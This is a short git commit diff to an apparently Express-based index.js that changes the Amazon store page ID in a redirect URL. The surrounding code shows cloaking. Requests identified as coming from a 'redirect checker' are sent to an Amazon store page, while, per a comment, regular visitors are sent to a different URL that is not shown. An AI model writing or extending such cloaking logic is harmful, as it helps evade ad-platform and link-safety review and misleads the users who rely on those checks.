b8c74769653d3017576ddd2aa6663b4055ae9a45
p1987ramya14 <167653518+p1987ramya14@users.noreply.github.com>
2024-08-08 20:27:06 +0530

    Update index.js

--- index.js
+++ index.js
@@ -11,7 +11,7 @@ app.get('/', (req, res) => {
 
     if (isRedirectChecker) {
         // Redirect checker sees this URL
-        const targetUrl = `https://www.amazon.com/stores/page/E84F360D-47C4-4DB2-BD6A-0A67B2DCD9D5?${queryParams}`;
+        const targetUrl = `https://www.amazon.com/stores/page/E7C039B0-7C21-4C92-8533-919D5E3E5D8C?${queryParams}`;
         res.redirect(302, targetUrl);
     } else {
         // Regular visitors see this URL
